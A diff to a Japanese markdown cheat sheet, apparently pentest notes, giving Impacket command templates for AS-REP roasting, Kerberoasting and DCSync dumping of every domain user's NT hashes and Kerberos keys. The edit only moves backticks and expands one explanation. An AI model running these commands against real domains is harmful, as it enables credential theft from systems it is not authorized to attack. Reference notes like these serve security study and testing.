@@ -32,8 +32,8 @@
     - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」  
       では「-userfile」内の各ユーザに対してASREPRoastを実行
   - GetUserSPNs  
-    「`impacket-GetUserSPNs -dc-ip ドメコンIP ドメイン名/ユーザ名:パスワード -outputfile 出力ファイル名`」  
-    でKerberoasting（取得したユーザのSPN）を実行
+    「`impacket-GetUserSPNs` -dc-ip ドメコンIP ドメイン名/ユーザ名:パスワード -outputfile 出力ファイル名」  
+    でKerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行
   - secretsdump  
     「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス」  
     でDCSync権限を持つドメインユーザを使用して、各ドメインユーザのNTハッシュやKerberosキーをダンプできる。
